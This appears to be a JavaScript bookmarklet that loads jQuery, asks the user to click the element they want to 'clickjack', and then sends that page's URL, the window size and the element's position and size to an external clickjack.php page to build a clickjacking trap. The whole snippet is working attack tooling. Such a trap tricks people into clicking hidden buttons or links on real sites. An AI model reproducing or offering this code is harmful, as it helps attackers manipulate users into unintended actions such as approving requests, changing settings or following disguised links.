var s=document.createElement('script');
s.setAttribute('src','http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.js');
document.body.appendChild(s);(function(){if(window.jQuery){
alert("Click on the link/button you want to clickjack. You will be redirected to the page to click people.")
jQuery("*").click(function(){var w=jQuery(window),t=jQuery(this),p=t.position();
location='http://www.antimatter15.com/misc/clickjack.php?q='+([location.href,
parseInt(w.width()),parseInt(w.height()),parseInt(p.top),
parseInt(p.left),parseInt(t.width()),parseInt(t.height())]);return false})
}else{setTimeout(arguments.callee,1000);}})();